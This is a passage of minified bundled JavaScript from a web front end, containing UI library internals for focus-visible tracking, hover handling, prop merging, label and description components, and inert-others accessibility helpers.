                return e.mozInputSource === 0 && e.isTrusted ? !0 : mk() && e.pointerType ? e.type === "click" && e.buttons === 1 : e.detail === 0 && !e.pointerType
            }
            class vk {
                isDefaultPrevented() {
                    return this.nativeEvent.defaultPrevented
                }
                preventDefault() {
                    this.defaultPrevented = !0, this.nativeEvent.preventDefault()
                }
                stopPropagation() {
                    this.nativeEvent.stopPropagation(), this.isPropagationStopped = () => !0
                }
                isPropagationStopped() {
                    return !1
                }
                persist() {}
                constructor(t, n) {
                    this.nativeEvent = n, this.target = n.target, this.currentTarget = n.currentTarget, this.relatedTarget = n.relatedTarget, this.bubbles = n.bubbles, this.cancelable = n.cancelable, this.defaultPrevented = n.defaultPrevented, this.eventPhase = n.eventPhase, this.isTrusted = n.isTrusted, this.timeStamp = n.timeStamp, this.type = t
                }
            }

            function kb(e) {
                let t = b.useRef({
                    isFocused: !1,
                    observer: null
                });
                _b(() => {
                    const r = t.current;
                    return () => {
                        r.observer && (r.observer.disconnect(), r.observer = null)
                    }
                }, []);
                let n = dk(r => {
                    e == null || e(r)
                });
                return b.useCallback(r => {
                    if (r.target instanceof HTMLButtonElement || r.target instanceof HTMLInputElement || r.target instanceof HTMLTextAreaElement || r.target instanceof HTMLSelectElement) {
                        t.current.isFocused = !0;
                        let i = r.target,
                            o = s => {
                                t.current.isFocused = !1, i.disabled && n(new vk("blur", s)), t.current.observer && (t.current.observer.disconnect(), t.current.observer = null)
                            };
                        i.addEventListener("focusout", o, {
                            once: !0
                        }), t.current.observer = new MutationObserver(() => {
                            if (t.current.isFocused && i.disabled) {
                                var s;
                                (s = t.current.observer) === null || s === void 0 || s.disconnect();
                                let a = i === document.activeElement ? null : document.activeElement;
                                i.dispatchEvent(new FocusEvent("blur", {
                                    relatedTarget: a
                                })), i.dispatchEvent(new FocusEvent("focusout", {
                                    bubbles: !0,
                                    relatedTarget: a
                                }))
                            }
                        }), t.current.observer.observe(i, {
                            attributes: !0,
                            attributeFilter: ["disabled"]
                        })
                    }
                }, [n])
            }

            function yk(e) {
                let {
                    isDisabled: t,
                    onFocus: n,
                    onBlur: r,
                    onFocusChange: i
                } = e;
                const o = b.useCallback(l => {
                        if (l.target === l.currentTarget) return r && r(l), i && i(!1), !0
                    }, [r, i]),
                    s = kb(o),
                    a = b.useCallback(l => {
                        const u = Bl(l.target);
                        l.target === l.currentTarget && u.activeElement === l.target && (n && n(l), i && i(!0), s(l))
                    }, [i, n, s]);
                return {
                    focusProps: {
                        onFocus: !t && (n || i || r) ? a : void 0,
                        onBlur: !t && (r || i) ? o : void 0
                    }
                }
            }
            let Ml = null,
                cp = new Set,
                Ta = new Map,
                to = !1,
                up = !1;
            const wk = {
                Tab: !0,
                Escape: !0
            };

            function e0(e, t) {
                for (let n of cp) n(e, t)
            }

            function bk(e) {
                return !(e.metaKey || !pk() && e.altKey || e.ctrlKey || e.key === "Control" || e.key === "Shift" || e.key === "Meta")
            }

            function cu(e) {
                to = !0, bk(e) && (Ml = "keyboard", e0("keyboard", e))
            }

            function an(e) {
                Ml = "pointer", (e.type === "mousedown" || e.type === "pointerdown") && (to = !0, e0("pointer", e))
            }

            function Tb(e) {
                gk(e) && (to = !0, Ml = "virtual")
            }

            function Ib(e) {
                e.target === window || e.target === document || (!to && !up && (Ml = "virtual", e0("virtual", e)), to = !1, up = !1)
            }

            function Cb() {
                to = !1, up = !0
            }

            function dp(e) {
                if (typeof window > "u" || Ta.get(Ni(e))) return;
                const t = Ni(e),
                    n = Bl(e);
                let r = t.HTMLElement.prototype.focus;
                t.HTMLElement.prototype.focus = function() {
                    to = !0, r.apply(this, arguments)
                }, n.addEventListener("keydown", cu, !0), n.addEventListener("keyup", cu, !0), n.addEventListener("click", Tb, !0), t.addEventListener("focus", Ib, !0), t.addEventListener("blur", Cb, !1), typeof PointerEvent < "u" ? (n.addEventListener("pointerdown", an, !0), n.addEventListener("pointermove", an, !0), n.addEventListener("pointerup", an, !0)) : (n.addEventListener("mousedown", an, !0), n.addEventListener("mousemove", an, !0), n.addEventListener("mouseup", an, !0)), t.addEventListener("beforeunload", () => {
                    Pb(e)
                }, {
                    once: !0
                }), Ta.set(t, {
                    focus: r
                })
            }
            const Pb = (e, t) => {
                const n = Ni(e),
                    r = Bl(e);
                t && r.removeEventListener("DOMContentLoaded", t), Ta.has(n) && (n.HTMLElement.prototype.focus = Ta.get(n).focus, r.removeEventListener("keydown", cu, !0), r.removeEventListener("keyup", cu, !0), r.removeEventListener("click", Tb, !0), n.removeEventListener("focus", Ib, !0), n.removeEventListener("blur", Cb, !1), typeof PointerEvent < "u" ? (r.removeEventListener("pointerdown", an, !0), r.removeEventListener("pointermove", an, !0), r.removeEventListener("pointerup", an, !0)) : (r.removeEventListener("mousedown", an, !0), r.removeEventListener("mousemove", an, !0), r.removeEventListener("mouseup", an, !0)), Ta.delete(n))
            };

            function xk(e) {
                const t = Bl(e);
                let n;
                return t.readyState !== "loading" ? dp(e) : (n = () => {
                    dp(e)
                }, t.addEventListener("DOMContentLoaded", n)), () => Pb(e, n)
            }
            typeof document < "u" && xk();

            function Rb() {
                return Ml !== "pointer"
            }
            const Ek = new Set(["checkbox", "radio", "range", "color", "file", "image", "button", "submit", "reset"]);

            function Ak(e, t, n) {
                var r;
                const i = typeof window < "u" ? Ni(n == null ? void 0 : n.target).HTMLInputElement : HTMLInputElement,
                    o = typeof window < "u" ? Ni(n == null ? void 0 : n.target).HTMLTextAreaElement : HTMLTextAreaElement,
                    s = typeof window < "u" ? Ni(n == null ? void 0 : n.target).HTMLElement : HTMLElement,
                    a = typeof window < "u" ? Ni(n == null ? void 0 : n.target).KeyboardEvent : KeyboardEvent;
                return e = e || (n == null ? void 0 : n.target) instanceof i && !Ek.has(n == null || (r = n.target) === null || r === void 0 ? void 0 : r.type) || (n == null ? void 0 : n.target) instanceof o || (n == null ? void 0 : n.target) instanceof s && (n == null ? void 0 : n.target.isContentEditable), !(e && t === "keyboard" && n instanceof a && !wk[n.key])
            }

            function _k(e, t, n) {
                dp(), b.useEffect(() => {
                    let r = (i, o) => {
                        Ak(!!(n != null && n.isTextInput), i, o) && e(Rb())
                    };
                    return cp.add(r), () => {
                        cp.delete(r)
                    }
                }, t)
            }

            function Sk(e) {
                let {
                    isDisabled: t,
                    onBlurWithin: n,
                    onFocusWithin: r,
                    onFocusWithinChange: i
                } = e, o = b.useRef({
                    isFocusWithin: !1
                }), s = b.useCallback(u => {
                    o.current.isFocusWithin && !u.currentTarget.contains(u.relatedTarget) && (o.current.isFocusWithin = !1, n && n(u), i && i(!1))
                }, [n, i, o]), a = kb(s), l = b.useCallback(u => {
                    !o.current.isFocusWithin && document.activeElement === u.target && (r && r(u), i && i(!0), o.current.isFocusWithin = !0, a(u))
                }, [r, i, a]);
                return t ? {
                    focusWithinProps: {
                        onFocus: void 0,
                        onBlur: void 0
                    }
                } : {
                    focusWithinProps: {
                        onFocus: l,
                        onBlur: s
                    }
                }
            }
            let uu = !1,
                Hf = 0;

            function fp() {
                uu = !0, setTimeout(() => {
                    uu = !1
                }, 50)
            }

            function Bv(e) {
                e.pointerType === "touch" && fp()
            }

            function kk() {
                if (!(typeof document > "u")) return typeof PointerEvent < "u" ? document.addEventListener("pointerup", Bv) : document.addEventListener("touchend", fp), Hf++, () => {
                    Hf--, !(Hf > 0) && (typeof PointerEvent < "u" ? document.removeEventListener("pointerup", Bv) : document.removeEventListener("touchend", fp))
                }
            }

            function Nb(e) {
                let {
                    onHoverStart: t,
                    onHoverChange: n,
                    onHoverEnd: r,
                    isDisabled: i
                } = e, [o, s] = b.useState(!1), a = b.useRef({
                    isHovered: !1,
                    ignoreEmulatedMouseEvents: !1,
                    pointerType: "",
                    target: null
                }).current;
                b.useEffect(kk, []);
                let {
                    hoverProps: l,
                    triggerHoverEnd: u
                } = b.useMemo(() => {
                    let c = (h, v) => {
                            if (a.pointerType = v, i || v === "touch" || a.isHovered || !h.currentTarget.contains(h.target)) return;
                            a.isHovered = !0;
                            let p = h.currentTarget;
                            a.target = p, t && t({
                                type: "hoverstart",
                                target: p,
                                pointerType: v
                            }), n && n(!0), s(!0)
                        },
                        d = (h, v) => {
                            if (a.pointerType = "", a.target = null, v === "touch" || !a.isHovered) return;
                            a.isHovered = !1;
                            let p = h.currentTarget;
                            r && r({
                                type: "hoverend",
                                target: p,
                                pointerType: v
                            }), n && n(!1), s(!1)
                        },
                        f = {};
                    return typeof PointerEvent < "u" ? (f.onPointerEnter = h => {
                        uu && h.pointerType === "mouse" || c(h, h.pointerType)
                    }, f.onPointerLeave = h => {
                        !i && h.currentTarget.contains(h.target) && d(h, h.pointerType)
                    }) : (f.onTouchStart = () => {
                        a.ignoreEmulatedMouseEvents = !0
                    }, f.onMouseEnter = h => {
                        !a.ignoreEmulatedMouseEvents && !uu && c(h, "mouse"), a.ignoreEmulatedMouseEvents = !1
                    }, f.onMouseLeave = h => {
                        !i && h.currentTarget.contains(h.target) && d(h, "mouse")
                    }), {
                        hoverProps: f,
                        triggerHoverEnd: d
                    }
                }, [t, n, r, i, a]);
                return b.useEffect(() => {
                    i && u({
                        currentTarget: a.target
                    }, a.pointerType)
                }, [i]), {
                    hoverProps: l,
                    isHovered: o
                }
            }

            function t0(e = {}) {
                let {
                    autoFocus: t = !1,
                    isTextInput: n,
                    within: r
                } = e, i = b.useRef({
                    isFocused: !1,
                    isFocusVisible: t || Rb()
                }), [o, s] = b.useState(!1), [a, l] = b.useState(() => i.current.isFocused && i.current.isFocusVisible), u = b.useCallback(() => l(i.current.isFocused && i.current.isFocusVisible), []), c = b.useCallback(h => {
                    i.current.isFocused = h, s(h), u()
                }, [u]);
                _k(h => {
                    i.current.isFocusVisible = h, u()
                }, [], {
                    isTextInput: n
                });
                let {
                    focusProps: d
                } = yk({
                    isDisabled: r,
                    onFocusChange: c
                }), {
                    focusWithinProps: f
                } = Sk({
                    isDisabled: !r,
                    onFocusWithinChange: c
                });
                return {
                    isFocused: o,
                    isFocusVisible: a,
                    focusProps: r ? f : d
                }
            }
            var Tk = Object.defineProperty,
                Ik = (e, t, n) => t in e ? Tk(e, t, {
                    enumerable: !0,
                    configurable: !0,
                    writable: !0,
                    value: n
                }) : e[t] = n,
                $f = (e, t, n) => (Ik(e, typeof t != "symbol" ? t + "" : t, n), n);
            let Ck = class {
                    constructor() {
                        $f(this, "current", this.detect()), $f(this, "handoffState", "pending"), $f(this, "currentId", 0)
                    }
                    set(t) {
                        this.current !== t && (this.handoffState = "pending", this.currentId = 0, this.current = t)
                    }
                    reset() {
                        this.set(this.detect())
                    }
                    nextId() {
                        return ++this.currentId
                    }
                    get isServer() {
                        return this.current === "server"
                    }
                    get isClient() {
                        return this.current === "client"
                    }
                    detect() {
                        return typeof window > "u" || typeof document > "u" ? "server" : "client"
                    }
                    handoff() {
                        this.handoffState === "pending" && (this.handoffState = "complete")
                    }
                    get isHandoffComplete() {
                        return this.handoffState === "complete"
                    }
                },
                zi = new Ck;

            function mi(e) {
                return zi.isServer ? null : e instanceof Node ? e.ownerDocument : e != null && e.hasOwnProperty("current") && e.current instanceof Node ? e.current.ownerDocument : document
            }

            function Ol(e) {
                typeof queueMicrotask == "function" ? queueMicrotask(e) : Promise.resolve().then(e).catch(t => setTimeout(() => {
                    throw t
                }))
            }

            function Yn() {
                let e = [],
                    t = {
                        addEventListener(n, r, i, o) {
                            return n.addEventListener(r, i, o), t.add(() => n.removeEventListener(r, i, o))
                        },
                        requestAnimationFrame(...n) {
                            let r = requestAnimationFrame(...n);
                            return t.add(() => cancelAnimationFrame(r))
                        },
                        nextFrame(...n) {
                            return t.requestAnimationFrame(() => t.requestAnimationFrame(...n))
                        },
                        setTimeout(...n) {
                            let r = setTimeout(...n);
                            return t.add(() => clearTimeout(r))
                        },
                        microTask(...n) {
                            let r = {
                                current: !0
                            };
                            return Ol(() => {
                                r.current && n[0]()
                            }), t.add(() => {
                                r.current = !1
                            })
                        },
                        style(n, r, i) {
                            let o = n.style.getPropertyValue(r);
                            return Object.assign(n.style, {
                                [r]: i
                            }), this.add(() => {
                                Object.assign(n.style, {
                                    [r]: o
                                })
                            })
                        },
                        group(n) {
                            let r = Yn();
                            return n(r), this.add(() => r.dispose())
                        },
                        add(n) {
                            return e.includes(n) || e.push(n), () => {
                                let r = e.indexOf(n);
                                if (r >= 0)
                                    for (let i of e.splice(r, 1)) i()
                            }
                        },
                        dispose() {
                            for (let n of e.splice(0)) n()
                        }
                    };
                return t
            }

            function Ms() {
                let [e] = b.useState(Yn);
                return b.useEffect(() => () => e.dispose(), [e]), e
            }
            let ve = (e, t) => {
                zi.isServer ? b.useEffect(e, t) : b.useLayoutEffect(e, t)
            };

            function xn(e) {
                let t = b.useRef(e);
                return ve(() => {
                    t.current = e
                }, [e]), t
            }
            let J = function(e) {
                let t = xn(e);
                return q.useCallback((...n) => t.current(...n), [t])
            };

            function Pk(e) {
                let t = e.width / 2,
                    n = e.height / 2;
                return {
                    top: e.clientY - n,
                    right: e.clientX + t,
                    bottom: e.clientY + n,
                    left: e.clientX - t
                }
            }

            function Rk(e, t) {
                return !(!e || !t || e.right < t.left || e.left > t.right || e.bottom < t.top || e.top > t.bottom)
            }

            function Bb({
                disabled: e = !1
            } = {}) {
                let t = b.useRef(null),
                    [n, r] = b.useState(!1),
                    i = Ms(),
                    o = J(() => {
                        t.current = null, r(!1), i.dispose()
                    }),
                    s = J(a => {
                        if (i.dispose(), t.current === null) {
                            t.current = a.currentTarget, r(!0); {
                                let l = mi(a.currentTarget);
                                i.addEventListener(l, "pointerup", o, !1), i.addEventListener(l, "pointermove", u => {
                                    if (t.current) {
                                        let c = Pk(u);
                                        r(Rk(c, t.current.getBoundingClientRect()))
                                    }
                                }, !1), i.addEventListener(l, "pointercancel", o, !1)
                            }
                        }
                    });
                return {
                    pressed: n,
                    pressProps: e ? {} : {
                        onPointerDown: s,
                        onPointerUp: o,
                        onClick: o
                    }
                }
            }
            let Nk = b.createContext(void 0);

            function Mb() {
                return b.useContext(Nk)
            }

            function hp(...e) {
                return Array.from(new Set(e.flatMap(t => typeof t == "string" ? t.split(" ") : []))).filter(Boolean).join(" ")
            }

            function Et(e, t, ...n) {
                if (e in t) {
                    let i = t[e];
                    return typeof i == "function" ? i(...n) : i
                }
                let r = new Error(`Tried to handle "${e}" but there is no handler defined. Only defined handlers are: ${Object.keys(t).map(i=>`"${i}"`).join(", ")}.`);
        throw Error.captureStackTrace && Error.captureStackTrace(r, Et), r
    }
    var ii = (e => (e[e.None = 0] = "None", e[e.RenderStrategy = 1] = "RenderStrategy", e[e.Static = 2] = "Static", e))(ii || {}),
        zr = (e => (e[e.Unmount = 0] = "Unmount", e[e.Hidden = 1] = "Hidden", e))(zr || {});

    function Pe() {
        let e = Mk();
        return b.useCallback(t => Bk({
            mergeRefs: e,
            ...t
        }), [e])
    }

    function Bk({
        ourProps: e,
        theirProps: t,
        slot: n,
        defaultTag: r,
        features: i,
        visible: o = !0,
        name: s,
        mergeRefs: a
    }) {
        a = a ?? Ok;
        let l = Ob(t, e);
        if (o) return fc(l, n, r, s, a);
        let u = i ?? 0;
        if (u & 2) {
            let {
                static: c = !1,
                ...d
            } = l;
            if (c) return fc(d, n, r, s, a)
        }
        if (u & 1) {
            let {
                unmount: c = !0,
                ...d
            } = l;
            return Et(c ? 0 : 1, {
                0() {
                    return null
                },
                1() {
                    return fc({ ...d,
                        hidden: !0,
                        style: {
                            display: "none"
                        }
                    }, n, r, s, a)
                }
            })
        }
        return fc(l, n, r, s, a)
    }

    function fc(e, t = {}, n, r, i) {
        let {
            as: o = n,
            children: s,
            refName: a = "ref",
            ...l
        } = Uf(e, ["unmount", "static"]), u = e.ref !== void 0 ? {
            [a]: e.ref
        } : {}, c = typeof s == "function" ? s(t) : s;
        "className" in l && l.className && typeof l.className == "function" && (l.className = l.className(t)), l["aria-labelledby"] && l["aria-labelledby"] === l.id && (l["aria-labelledby"] = void 0);
        let d = {};
        if (t) {
            let f = !1,
                h = [];
            for (let [v, p] of Object.entries(t)) typeof p == "boolean" && (f = !0), p === !0 && h.push(v.replace(/([A-Z])/g, w => `-${w.toLowerCase()}`));
            if (f) {
                d["data-headlessui-state"] = h.join(" ");
                for (let v of h) d[`data-${v}`] = ""
            }
        }
        if (o === b.Fragment && (Object.keys(_i(l)).length > 0 || Object.keys(_i(d)).length > 0))
            if (!b.isValidElement(c) || Array.isArray(c) && c.length > 1) {
                if (Object.keys(_i(l)).length > 0) throw new Error(['Passing props on "Fragment"!', "", `The current component <${r} /> is rendering a "Fragment".`, "However we need to passthrough the following props:", Object.keys(_i(l)).concat(Object.keys(_i(d))).map(f => `  - ${f}`).join(`
`), "", "You can apply a few solutions:", ['Add an `as="..."` prop, to ensure that we render an actual element instead of a "Fragment".', "Render a single element as the child so that we can forward the props onto that element."].map(f => `  - ${f}`).join(`
`)].join(`
`))
            } else {
                let f = c.props,
                    h = f == null ? void 0 : f.className,
                    v = typeof h == "function" ? (...m) => hp(h(...m), l.className) : hp(h, l.className),
                    p = v ? {
                        className: v
                    } : {},
                    w = Ob(c.props, _i(Uf(l, ["ref"])));
                for (let m in d) m in w && delete d[m];
                return b.cloneElement(c, Object.assign({}, w, d, u, {
                    ref: i(Lk(c), u.ref)
                }, p))
            }
        return b.createElement(o, Object.assign({}, Uf(l, ["ref"]), o !== b.Fragment && u, o !== b.Fragment && d), c)
    }

    function Mk() {
        let e = b.useRef([]),
            t = b.useCallback(n => {
                for (let r of e.current) r != null && (typeof r == "function" ? r(n) : r.current = n)
            }, []);
        return (...n) => {
            if (!n.every(r => r == null)) return e.current = n, t
        }
    }

    function Ok(...e) {
        return e.every(t => t == null) ? void 0 : t => {
            for (let n of e) n != null && (typeof n == "function" ? n(t) : n.current = t)
        }
    }

    function Ob(...e) {
        if (e.length === 0) return {};
        if (e.length === 1) return e[0];
        let t = {},
            n = {};
        for (let r of e)
            for (let i in r) i.startsWith("on") && typeof r[i] == "function" ? (n[i] != null || (n[i] = []), n[i].push(r[i])) : t[i] = r[i];
        if (t.disabled || t["aria-disabled"])
            for (let r in n) /^(on(?:Click|Pointer|Mouse|Key)(?:Down|Up|Press)?)$/.test(r) && (n[r] = [i => {
                var o;
                return (o = i == null ? void 0 : i.preventDefault) == null ? void 0 : o.call(i)
            }]);
        for (let r in n) Object.assign(t, {
            [r](i, ...o) {
                let s = n[r];
                for (let a of s) {
                    if ((i instanceof Event || (i == null ? void 0 : i.nativeEvent) instanceof Event) && i.defaultPrevented) return;
                    a(i, ...o)
                }
            }
        });
        return t
    }

    function Id(...e) {
        if (e.length === 0) return {};
        if (e.length === 1) return e[0];
        let t = {},
            n = {};
        for (let r of e)
            for (let i in r) i.startsWith("on") && typeof r[i] == "function" ? (n[i] != null || (n[i] = []), n[i].push(r[i])) : t[i] = r[i];
        for (let r in n) Object.assign(t, {
            [r](...i) {
                let o = n[r];
                for (let s of o) s == null || s(...i)
            }
        });
        return t
    }

    function _e(e) {
        var t;
        return Object.assign(b.forwardRef(e), {
            displayName: (t = e.displayName) != null ? t : e.name
        })
    }

    function _i(e) {
        let t = Object.assign({}, e);
        for (let n in t) t[n] === void 0 && delete t[n];
        return t
    }

    function Uf(e, t = []) {
        let n = Object.assign({}, e);
        for (let r of t) r in n && delete n[r];
        return n
    }

    function Lk(e) {
        return q.version.split(".")[0] >= "19" ? e.props.ref : e.ref
    }
    let Fk = "span";
    var Ya = (e => (e[e.None = 1] = "None", e[e.Focusable = 2] = "Focusable", e[e.Hidden = 4] = "Hidden", e))(Ya || {});

    function Dk(e, t) {
        var n;
        let {
            features: r = 1,
            ...i
        } = e, o = {
            ref: t,
            "aria-hidden": (r & 2) === 2 ? !0 : (n = i["aria-hidden"]) != null ? n : void 0,
            hidden: (r & 4) === 4 ? !0 : void 0,
            style: {
                position: "fixed",
                top: 1,
                left: 1,
                width: 1,
                height: 0,
                padding: 0,
                margin: -1,
                overflow: "hidden",
                clip: "rect(0, 0, 0, 0)",
                whiteSpace: "nowrap",
                borderWidth: "0",
                ...(r & 4) === 4 && (r & 2) !== 2 && {
                    display: "none"
                }
            }
        };
        return Pe()({
            ourProps: o,
            theirProps: i,
            slot: {},
            defaultTag: Fk,
            name: "Hidden"
        })
    }
    let Ja = _e(Dk),
        jk = b.createContext(void 0);

    function Hk() {
        return b.useContext(jk)
    }

    function $k(e) {
        let t = e.parentElement,
            n = null;
        for (; t && !(t instanceof HTMLFieldSetElement);) t instanceof HTMLLegendElement && (n = t), t = t.parentElement;
        let r = (t == null ? void 0 : t.getAttribute("disabled")) === "";
        return r && Uk(n) ? !1 : r
    }

    function Uk(e) {
        if (!e) return !1;
        let t = e.previousElementSibling;
        for (; t !== null;) {
            if (t instanceof HTMLLegendElement) return !1;
            t = t.previousElementSibling
        }
        return !0
    }
    let Lb = Symbol();

    function zk(e, t = !0) {
        return Object.assign(e, {
            [Lb]: t
        })
    }

    function We(...e) {
        let t = b.useRef(e);
        b.useEffect(() => {
            t.current = e
        }, [e]);
        let n = J(r => {
            for (let i of t.current) i != null && (typeof i == "function" ? i(r) : i.current = r)
        });
        return e.every(r => r == null || (r == null ? void 0 : r[Lb])) ? void 0 : n
    }
    let n0 = b.createContext(null);
    n0.displayName = "DescriptionContext";

    function Fb() {
        let e = b.useContext(n0);
        if (e === null) {
            let t = new Error("You used a <Description /> component, but it is not inside a relevant parent.");
            throw Error.captureStackTrace && Error.captureStackTrace(t, Fb), t
        }
        return e
    }

    function Db() {
        let [e, t] = b.useState([]);
        return [e.length > 0 ? e.join(" ") : void 0, b.useMemo(() => function(n) {
            let r = J(o => (t(s => [...s, o]), () => t(s => {
                    let a = s.slice(),
                        l = a.indexOf(o);
                    return l !== -1 && a.splice(l, 1), a
                }))),
                i = b.useMemo(() => ({
                    register: r,
                    slot: n.slot,
                    name: n.name,
                    props: n.props,
                    value: n.value
                }), [r, n.slot, n.name, n.props, n.value]);
            return q.createElement(n0.Provider, {
                value: i
            }, n.children)
        }, [t])]
    }
    let Gk = "p";

    function Vk(e, t) {
        let n = b.useId(),
            r = Mb(),
            {
                id: i = `headlessui-description-${n}`,
                ...o
            } = e,
            s = Fb(),
            a = We(t);
        ve(() => s.register(i), [i, s.register]);
        let l = r || !1,
            u = b.useMemo(() => ({ ...s.slot,
                disabled: l
            }), [s.slot, l]),
            c = {
                ref: a,
                ...s.props,
                id: i
            };
        return Pe()({
            ourProps: c,
            theirProps: o,
            slot: u,
            defaultTag: Gk,
            name: s.name || "Description"
        })
    }
    let Wk = _e(Vk),
        qk = Object.assign(Wk, {});
    var Ee = (e => (e.Space = " ", e.Enter = "Enter", e.Escape = "Escape", e.Backspace = "Backspace", e.Delete = "Delete", e.ArrowLeft = "ArrowLeft", e.ArrowUp = "ArrowUp", e.ArrowRight = "ArrowRight", e.ArrowDown = "ArrowDown", e.Home = "Home", e.End = "End", e.PageUp = "PageUp", e.PageDown = "PageDown", e.Tab = "Tab", e))(Ee || {});
    let Cd = b.createContext(null);
    Cd.displayName = "LabelContext";

    function r0() {
        let e = b.useContext(Cd);
        if (e === null) {
            let t = new Error("You used a <Label /> component, but it is not inside a relevant parent.");
            throw Error.captureStackTrace && Error.captureStackTrace(t, r0), t
        }
        return e
    }

    function Qk(e) {
        var t, n, r;
        let i = (n = (t = b.useContext(Cd)) == null ? void 0 : t.value) != null ? n : void 0;
        return ((r = void 0) != null ? r : 0) > 0 ? [i, ...e].filter(Boolean).join(" ") : i
    }

    function jb({
        inherit: e = !1
    } = {}) {
        let t = Qk(),
            [n, r] = b.useState([]),
            i = e ? [t, ...n].filter(Boolean) : n;
        return [i.length > 0 ? i.join(" ") : void 0, b.useMemo(() => function(o) {
            let s = J(l => (r(u => [...u, l]), () => r(u => {
                    let c = u.slice(),
                        d = c.indexOf(l);
                    return d !== -1 && c.splice(d, 1), c
                }))),
                a = b.useMemo(() => ({
                    register: s,
                    slot: o.slot,
                    name: o.name,
                    props: o.props,
                    value: o.value
                }), [s, o.slot, o.name, o.props, o.value]);
            return q.createElement(Cd.Provider, {
                value: a
            }, o.children)
        }, [r])]
    }
    let Kk = "label";

    function Zk(e, t) {
        var n;
        let r = b.useId(),
            i = r0(),
            o = Hk(),
            s = Mb(),
            {
                id: a = `headlessui-label-${r}`,
                htmlFor: l = o ?? ((n = i.props) == null ? void 0 : n.htmlFor),
                passive: u = !1,
                ...c
            } = e,
            d = We(t);
        ve(() => i.register(a), [a, i.register]);
        let f = J(w => {
                let m = w.currentTarget;
                if (m instanceof HTMLLabelElement && w.preventDefault(), i.props && "onClick" in i.props && typeof i.props.onClick == "function" && i.props.onClick(w), m instanceof HTMLLabelElement) {
                    let g = document.getElementById(m.htmlFor);
                    if (g) {
                        let y = g.getAttribute("disabled");
                        if (y === "true" || y === "") return;
                        let x = g.getAttribute("aria-disabled");
                        if (x === "true" || x === "") return;
                        (g instanceof HTMLInputElement && (g.type === "radio" || g.type === "checkbox") || g.role === "radio" || g.role === "checkbox" || g.role === "switch") && g.click(), g.focus({
                            preventScroll: !0
                        })
                    }
                }
            }),
            h = s || !1,
            v = b.useMemo(() => ({ ...i.slot,
                disabled: h
            }), [i.slot, h]),
            p = {
                ref: d,
                ...i.props,
                id: a,
                htmlFor: l,
                onClick: f
            };
        return u && ("onClick" in p && (delete p.htmlFor, delete p.onClick), "onClick" in c && delete c.onClick), Pe()({
            ourProps: p,
            theirProps: c,
            slot: v,
            defaultTag: l ? Kk : "div",
            name: i.name || "Label"
        })
    }
    let Yk = _e(Zk);
    Object.assign(Yk, {});
    let Jk = b.createContext(() => {});

    function Xk({
        value: e,
        children: t
    }) {
        return q.createElement(Jk.Provider, {
            value: e
        }, t)
    }

    function eT(e) {
        if (e === null) return {
            width: 0,
            height: 0
        };
        let {
            width: t,
            height: n
        } = e.getBoundingClientRect();
        return {
            width: t,
            height: n
        }
    }

    function tT(e, t = !1) {
        let [n, r] = b.useReducer(() => ({}), {}), i = b.useMemo(() => eT(e), [e, n]);
        return ve(() => {
            if (!e) return;
            let o = new ResizeObserver(r);
            return o.observe(e), () => {
                o.disconnect()
            }
        }, [e]), t ? {
            width: `${i.width}px`,
            height: `${i.height}px`
        } : i
    }
    let nT = class extends Map {
        constructor(t) {
            super(), this.factory = t
        }
        get(t) {
            let n = super.get(t);
            return n === void 0 && (n = this.factory(t), this.set(t, n)), n
        }
    };

    function Hb(e, t) {
        let n = e(),
            r = new Set;
        return {
            getSnapshot() {
                return n
            },
            subscribe(i) {
                return r.add(i), () => r.delete(i)
            },
            dispatch(i, ...o) {
                let s = t[i].call(n, ...o);
                s && (n = s, r.forEach(a => a()))
            }
        }
    }

    function $b(e) {
        return b.useSyncExternalStore(e.subscribe, e.getSnapshot, e.getSnapshot)
    }
    let rT = new nT(() => Hb(() => [], {
        ADD(e) {
            return this.includes(e) ? this : [...this, e]
        },
        REMOVE(e) {
            let t = this.indexOf(e);
            if (t === -1) return this;
            let n = this.slice();
            return n.splice(t, 1), n
        }
    }));

    function Os(e, t) {
        let n = rT.get(t),
            r = b.useId(),
            i = $b(n);
        if (ve(() => {
                if (e) return n.dispatch("ADD", r), () => n.dispatch("REMOVE", r)
            }, [n, e]), !e) return !1;
        let o = i.indexOf(r),
            s = i.length;
        return o === -1 && (o = s, s += 1), o === s - 1
    }
    let pp = new Map,
        Ia = new Map;

    function Mv(e) {
        var t;
        let n = (t = Ia.get(e)) != null ? t : 0;
        return Ia.set(e, n + 1), n !== 0 ? () => Ov(e) : (pp.set(e, {
            "aria-hidden": e.getAttribute("aria-hidden"),
            inert: e.inert
        }), e.setAttribute("aria-hidden", "true"), e.inert = !0, () => Ov(e))
    }

    function Ov(e) {
        var t;
        let n = (t = Ia.get(e)) != null ? t : 1;
        if (n === 1 ? Ia.delete(e) : Ia.set(e, n - 1), n !== 1) return;
        let r = pp.get(e);
        r && (r["aria-hidden"] === null ? e.removeAttribute("aria-hidden") : e.setAttribute("aria-hidden", r["aria-hidden"]), e.inert = r.inert, pp.delete(e))
    }

    function Ub(e, {
        allowed: t,
        disallowed: n
    } = {}) {
        let r = Os(e, "inert-others");
        ve(() => {
            var i, o;
            if (!r) return;
            let s = Yn();
            for (let l of (i = n == null ? void 0 : n()) != null ? i : []) l && s.add(Mv(l));
            let a = (o = t == null ? void 0 : t()) != null ? o : [];
            for (let l of a) {
                if (!l) continue;
                let u = mi(l);
                if (!u) continue;
                let c = l.parentElement;
                for (; c && c !== u.body;) {
                    for (let d of c.children) a.some(f => d.contains(f)) || s.add(Mv(d));
                    c = c.parentElement
                }
            }
            return s.dispose
        }, [r, t, n])
    }

    function zb(e, t, n) {
        let r = xn(i => {
            let o = i.getBoundingClientRect();
            o.x === 0 && o.y === 0 && o.width === 0 && o.height === 0 && n()
        });
        b.useEffect(() => {
            if (!e) return;
            let i = t === null ? null : t instanceof HTMLElement ? t : t.current;
            if (!i) return;
            let o = Yn();
            if (typeof ResizeObserver < "u") {
                let s = new ResizeObserver(() => r.current(i));
                s.observe(i), o.add(() => s.disconnect())
            }
            if (typeof IntersectionObserver < "u") {
                let s = new IntersectionObserver(() => r.current(i));
                s.observe(i), o.add(() => s.disconnect())
            }
            return () => o.dispose()
        }, [t, r, e])
    }
    let du = ["[contentEditable=true]", "[tabindex]", "a[href]", "area[href]", "button:not([disabled])", "iframe", "input:not([disabled])", "select:not([disabled])", "textarea:not([disabled])"].map(e => `${e}:not([tabindex='-1'])`).join(","),
        iT = ["[data-autofocus]"].map(e => `${e}:not([tabindex='-1'])`).join(",");
